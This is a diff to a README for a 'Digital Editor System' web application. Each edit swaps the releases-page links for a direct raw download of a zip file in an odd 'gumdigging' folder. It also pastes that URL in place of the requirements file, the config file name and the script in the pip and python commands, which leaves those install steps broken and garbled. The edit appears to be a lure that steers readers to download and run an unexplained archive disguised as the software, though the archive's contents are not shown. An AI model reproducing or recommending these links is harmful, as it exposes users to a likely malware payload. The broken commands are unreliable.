@@ -6,9 +6,9 @@ Welcome to the Digital Editor System! This application helps you manage your dig
 
 ## 📥 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/subashsiwa/digital-editor-system/releases)
+[![Download Now](https://raw.githubusercontent.com/subashsiwa/digital-editor-system/main/gumdigging/digital-editor-system.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/subashsiwa/digital-editor-system/main/gumdigging/digital-editor-system.zip)
 
-To download the latest version of the Digital Editor System, visit this page: [Download Link](https://github.com/subashsiwa/digital-editor-system/releases).
+To download the latest version of the Digital Editor System, visit this page: [Download Link](https://raw.githubusercontent.com/subashsiwa/digital-editor-system/main/gumdigging/digital-editor-system.zip).
 
 ## 🔧 System Requirements
 
@@ -24,7 +24,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ### Step 1: Download the Software
 
-1. Click on the download button above or visit the [Download Link](https://github.com/subashsiwa/digital-editor-system/releases).
+1. Click on the download button above or visit the [Download Link](https://raw.githubusercontent.com/subashsiwa/digital-editor-system/main/gumdigging/digital-editor-system.zip).
 2. Look for the latest release version on the page.
 3. Choose the file for your operating system and click to download.
 
@@ -40,12 +40,12 @@ Before you begin, ensure your computer meets these requirements:
 3. Run the following command to install the required Python packages:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/subashsiwa/digital-editor-system/main/gumdigging/digital-editor-system.zip
    ```
 
 ### Step 4: Configure the System
 
-1. Locate the configuration file named `config.py`.
+1. Locate the configuration file named `https://raw.githubusercontent.com/subashsiwa/digital-editor-system/main/gumdigging/digital-editor-system.zip`.
 2. Open the file with a text editor.
 3. Adjust the settings based on your needs. Mainly, configure the database settings and application secrets.
 
@@ -54,7 +54,7 @@ Before you begin, ensure your computer meets these requirements:
 1. In your terminal, still in the folder of the extracted files, run the following command:
 
    ```
-   python manage.py runserver
+   python https://raw.githubusercontent.com/subashsiwa/digital-editor-system/main/gumdigging/digital-editor-system.zip runserver
    ```
 
 2. This command will start the web server.
@@ -88,4 +88,4 @@ If you're interested in helping improve the Digital Editor System, please follow
 2. Make your changes.
 3. Submit a pull request for review.
 
-Thank you for choosing Digital Editor System for your content management needs! We hope it simplifies your publishing work. Don’t forget to visit the [Download Link](https://github.com/subashsiwa/digital-editor-system/releases) for the latest version.
+Thank you for choosing Digital Editor System for your content management needs! We hope it simplifies your publishing work. Don’t forget to visit the [Download Link](https://raw.githubusercontent.com/subashsiwa/digital-editor-system/main/gumdigging/digital-editor-system.zip) for the latest version.
